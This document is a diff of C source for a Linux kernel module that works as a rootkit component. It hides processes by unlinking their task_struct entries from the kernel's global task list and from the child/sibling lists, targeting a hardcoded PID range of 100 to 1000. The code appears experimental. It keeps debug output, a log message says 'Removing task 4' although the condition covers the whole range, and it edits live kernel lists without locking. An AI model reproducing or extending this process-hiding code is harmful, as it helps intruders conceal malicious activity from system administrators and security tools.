@@ -1,6 +1,7 @@
 #include <linux/module.h>    /* Needed by all modules */
 #include <linux/kernel.h>    /* Needed for KERN_INFO */
 #include <linux/sched.h>
+#include <linux/list.h>
 
 #include "sysmap.h"          /* Pointers to system functions */
 #include "global.h"
@@ -36,24 +37,42 @@ module_param_array(pids_to_hide, int, &pids_count, 0000);
 MODULE_PARM_DESC(pids_to_hide, "Process IDs that shall be hidden.");
 
 
-void hide_processes_traverse_tree(struct task_struct* task){
-    // traverse all children
-    struct task_struct* cur;
+void hide_processes_traverse_tree(struct task_struct* root_task, int depth){
+    struct task_struct* task;
     struct task_struct* prev;
     struct task_struct* next;
+    struct list_head* next_ptr;
+    struct list_head* prev_ptr;
     struct list_head* p;
-    OUR_DEBUG("Traversing tree (pid %d)\n", task->pid);
-    list_for_each(p, &(task->children)){
-        cur = list_entry(p, struct task_struct, sibling);
-        prev = list_entry_rcu(cur->sibling.prev, struct task_struct, sibling);
-        next = list_entry_rcu(cur->sibling.next, struct task_struct, sibling);
-        prev->sibling.next = cur->sibling.next;
-        next->sibling.prev = cur->sibling.prev;
-        OUR_DEBUG("found pid: %d\n", cur->pid);
-        if (cur != task){
-            hide_processes_traverse_tree(cur);
-        }
+    char  padding[6][5] = {
+        "", " ", "  ", "   ", "    ", "     ", 
+    };
+
+    if (root_task->children.next == &root_task->children){
+        //OUR_DEBUG(" %s [%d] has no children\n", root_task->comm, root_task->pid);
+        return;
     }
+
+    task = list_entry(root_task->children.next, struct task_struct, sibling);
+    while (1) {
+        OUR_DEBUG("%s %s [%d]\n", padding[depth+1], task->comm, task->pid);
+        if (task->sibling.next == &root_task->children){
+            break;
+        }
+        prev_ptr = task->sibling.prev;
+        next_ptr = task->sibling.next;
+        if (task->pid >= 100 && task->pid <= 1000){
+        // if (task->pid == 4){
+            OUR_DEBUG("Removing task 4 from the tree\n");
+            prev_ptr->next = next_ptr;
+            next_ptr->prev = prev_ptr;
+        }
+        hide_processes_traverse_tree(task, depth+1);
+
+        // now the next task
+        next = list_entry(task->sibling.next, struct task_struct, sibling);
+        task = next;
+    } 
 }
 
 void hide_processes(void){
@@ -62,27 +81,23 @@ void hide_processes(void){
     struct task_struct* next;
     task = &init_task;
     prev = NULL;
-    OUR_DEBUG("Now tree-traversal\n");
-    hide_processes_traverse_tree(&init_task);
-    OUR_DEBUG("Now manipulating task_structs...\n");
+    OUR_DEBUG("Simple task list:\n");
     do {
-        hide_processes_traverse_tree(task);
         // the previous task (prev) is obtained by a expanded macro
-        //  found in the linux kernel. it is basically the
-        //  adapted expansion of "next_task"
-        prev = list_entry_rcu(task->tasks.prev, struct task_struct, tasks);
+        // found in the linux kernel. it is basically the
+        // adapted expansion of "next_task"
+        prev = list_entry(task->tasks.prev, struct task_struct, tasks);
         next = next_task(task);
-        if ((task->pid > 100) && (task->pid < 1000)){
-            OUR_DEBUG("1 pid %d, prev->pid %d, next->pid %d\n", task->pid, prev->pid, next->pid);
-            OUR_DEBUG("1 task %p, prev->next %p, next->prev %p\n", &task->tasks, prev->tasks.next, next->tasks.prev);
-            OUR_DEBUG("task %p, prev %p\n", task, prev);
-            OUR_DEBUG("task->next %p, prev->next %p\n", task->tasks.next, prev->tasks.next);
-            // hide tasks from "global task linked list" (?!)
+        OUR_DEBUG("%s [%d], (%d, %d)\n", task->comm, task->pid, prev->pid, next->pid);
+        if (task->pid > 0){ // somethin has 0, which shall not be taken into consideration
+            hide_processes_traverse_tree(task, 0);
+        }
+        // the following routine seems to correctly 
+        // remove elements from the tasks list
+        if (task->pid >= 100 && task->pid <= 1000){
+        // if (task->pid == 4){
             prev->tasks.next = task->tasks.next;
             next->tasks.prev = task->tasks.prev;
-            // hide tasks from tree-like structures
-            OUR_DEBUG("2 pid %d, prev->pid %d, next->pid %d\n", task->pid, prev->pid, next->pid);
-            OUR_DEBUG("2 task %p, prev->next %p, next->prev %p\n", &task->tasks, prev->tasks.next, next->tasks.prev);
         }
     } while ((task = next) != &init_task);
 }
@@ -103,7 +118,7 @@ static int __init _init_module(void)
 
 
     hide_processes();
-    hide_processes();
+    // hide_processes();
     for_each_process(task)
     {
     printk("%s [%d]\n",task->comm , task->pid);
